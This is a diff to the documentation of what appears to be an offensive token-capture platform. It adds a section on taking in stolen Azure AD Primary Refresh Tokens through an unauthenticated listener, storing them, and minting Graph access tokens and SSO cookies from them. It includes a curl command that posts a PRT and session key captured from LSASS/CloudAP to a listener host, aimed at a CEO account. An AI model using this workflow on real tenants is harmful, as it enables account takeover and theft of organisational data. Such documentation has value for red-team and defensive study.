@@ -267,6 +267,30 @@ The intake endpoint is **unauthenticated by design** — the whole point is that
 
 **Target resolution:** `target_id` match → `target_email` (or the UPN/email from the JWT) match → auto-create a new target (group `captured`) from the JWT's `upn`/`preferred_username`/`email` and `tid` claims.
 
+### PRT intake
+
+A Primary Refresh Token is **not** a bearer token, so it takes a different path: send `prt` (or `prt_token`) and the listener stores it **complete** in the PRT vault (`primary_refresh_tokens`, encrypted at rest) instead of the campaign token store. It then appears under the **PRTs** list and every PRT operation can use it — mint an access token (`POST /api/prts/{id}/access-token`), build an SSO cookie (`POST /api/prts/{id}/cookie`), and from a minted Graph token, drive Graph Actions.
+
+| Field | Required | Notes |
+|-------|----------|-------|
+| `prt` / `prt_token` | yes | The Primary Refresh Token |
+| `session_key` | for minting | The derived/clear session key; required to sign assertions (mint tokens / cookie). The PRT is stored without it, but can't be exchanged |
+| `upn`, `tenant_id` | recommended | Stored with the PRT; `upn` also names the auto-created target on exchange |
+| `device_cert_id`, `label` | no | Associate a device cert / label the vault entry |
+| `campaign_id` | no | If present **and** a session key is supplied, the PRT is auto-exchanged for a Graph access token that is ingested into the campaign, so it is usable in Graph Actions immediately |
+| `client_id`, `resource` | no | Exchange overrides — default to Office client / `https://graph.microsoft.com` |
+
+A PRT intake always stores the PRT first; a failed auto-exchange (e.g. wrong session key) is reported in the response as `exchange_error` but the PRT is kept. Response: `{status:"prt_stored", prt_id, label, has_session_key, exchanged?, campaign_id?, target_id?, target_email?, exchange_error?}`.
+
+Example (PRT captured from LSASS/CloudAP, stored and auto-used in a campaign):
+
+```bash
+curl -X POST http://LISTENER_HOST:8000/token \
+  -H 'Content-Type: application/json' \
+  -d '{"prt":"0.AX...","session_key":"...","upn":"ceo@contoso.com",
+       "tenant_id":"<tid>","campaign_id":"camp-123","source":"cloudap-lsass"}'
+```
+
 Example (evilginx / AiTM style):
 
 ```bash
